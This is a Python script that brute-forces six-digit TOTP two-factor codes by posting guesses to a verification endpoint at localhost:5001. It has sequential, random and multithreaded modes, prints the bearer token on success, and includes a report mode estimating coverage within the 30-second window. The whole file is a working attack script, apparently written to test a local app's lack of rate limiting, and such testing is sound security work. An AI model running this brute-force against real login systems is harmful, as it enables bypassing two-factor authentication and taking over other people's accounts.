"""
Description: This file has a simple brute force attack where it iterates
from 000000 to 9999999 (6 digits) to try to break the 2FA. It automatically
stops after 30 seconds as that is the time the TOTP of Google Authenticator resets.
Input arguments:
1. user_id: int
2. email: stri
3. function to call: str
    - "simple"
    - "random"
    - "mp"
"""


import argparse
import itertools
import requests
import time
import sys
import threading
import random
import os

# Shared attempts counter
shared_attempts = 0
attempts_lock = threading.Lock()

"""
General function to test if the try out code works.
"""
def try_code_possibility(user_id, email, code):
    url = "http://localhost:5001/verify-2fa"
    payload = {"user_id": user_id, "email": email, "code": code}

    # Send the POST request to the API
    response = requests.post(url, json=payload)

    # Check if the response is successful (200 is the correct code for https)
    if response.status_code == 200:
        print(f"\n\nSuccess! Code {code} is valid.")
        print(f"Bearer token: {response.json().get('token')}")
        return 0
    else:
        print(f"Attempted code: {code}, response: {response.status_code}")
        return 1

"""
Function to iterate form 0 to 999999.
"""
def brute_force_simple(user_id, email):
    start_time = time.time()
    attempts = 0

    # Iterate from 000000 to 999999 (6 digits)
    for code_tuple in itertools.product("0123456789", repeat=6):

        code = "".join(code_tuple)

        result = try_code_possibility(user_id, email, code)
        attempts += 1

        end_time = time.time()

        if result == 0:
            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(0)

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if end_time - start_time > 30.0:
            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(1)

"""
Function for each thread to execute
"""
def thread_function(user_id, email, start, end):
    start_time = time.time()
    local_attempts = 0
    global shared_attempts

    for code_num in range(start, end):
        code = f"{code_num:06d}"

        result = try_code_possibility(user_id, email, code)

        end_time = time.time()

        local_attempts += 1

        if result == 0:
            # lock global variable so no data race happens
            with attempts_lock:
                shared_attempts += local_attempts

            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds.")
            return 0
            

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if end_time - start_time > 30.0:
            # lock global variable so no data race happens
            with attempts_lock:
                shared_attempts += local_attempts

            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds.")
            return 1


"""
Function that checks the numebr of available cores and tries using Mp
"""
# Function to perform brute-force attack
def brute_force_mp(user_id, email):
    num_threads = os.cpu_count() # use one thread for 1 core, for simplicity
    total_codes = 1000000  # Total number of possibilities for from 000000 to 999999
    codes_per_thread = total_codes // num_threads
    threads = []


    # Create and start threads
    for i in range(num_threads):
        start = i * codes_per_thread
        end = start + codes_per_thread if i < num_threads - 1 else total_codes
        thread = threading.Thread(target=thread_function, args=(user_id, email, start, end))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print(f"Total number of {shared_attempts} attempts.")
    


"""
Brute Force using a single random  numbers (6 digits)
"""
def brute_force_random(user_id, email):
    start_time = time.time()
    attempts = 0

    while True:
        # Generate a random code (6 digits) with leading zeros
        code = f"{random.randint(0, 999999):06d}"
        

        result = try_code_possibility(user_id, email, code)
        attempts += 1

        end_time = time.time()

        if result == 0:
            print(f"Brute-force attack completed in {end_time - start_time:.2f} seconds with {attempts} attempts.")
            sys.exit(0)

        # Check if the 30s has surpassed, if so exit.
        # Reason: TOTP resets every 30s.
        if end_time - start_time > 30.0:
            print(f"Brute-force attack stopped after {end_time-start_time:.2f} seconds  with {attempts} attempts.")
            sys.exit(1)

"""
Print statements to get information about brute force attack
"""
def generate_report(user_id, email):
    start_time = time.time()
    result = try_code_possibility(user_id, email, "123456")
    end_time = time.time()
    time_of_single_attempt = end_time - start_time
    maximum_time = 30
    possible_codes = 1000000
    number_of_attempts_possible = maximum_time // time_of_single_attempt
    percentage_code_tried = (number_of_attempts_possible / possible_codes) * 100
    print(f"Generate the theoretical Brute-force attack report...")
    print(f"Single attempt cost: {time_of_single_attempt} seconds.")
    print(f"Maximum number of tries before the TOTP resets: {number_of_attempts_possible} attempts")
    print(f"Possible codes tried before TOTP resets: {percentage_code_tried} %")





if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Brute-force attack for 2FA verification."
    )

    parser.add_argument("user_id", type=int)
    parser.add_argument("email", type=str)
    parser.add_argument("method", type=str, choices=["simple", "random", "mp", "report"])
    inputargs = parser.parse_args()

    # Call the brute-force function with input arguments
    fn_switch = {
        "simple": brute_force_simple,
        "random": brute_force_random,
        "mp": brute_force_mp,
        "report": generate_report
    }

    fn_switch[inputargs.method](inputargs.user_id, inputargs.email)
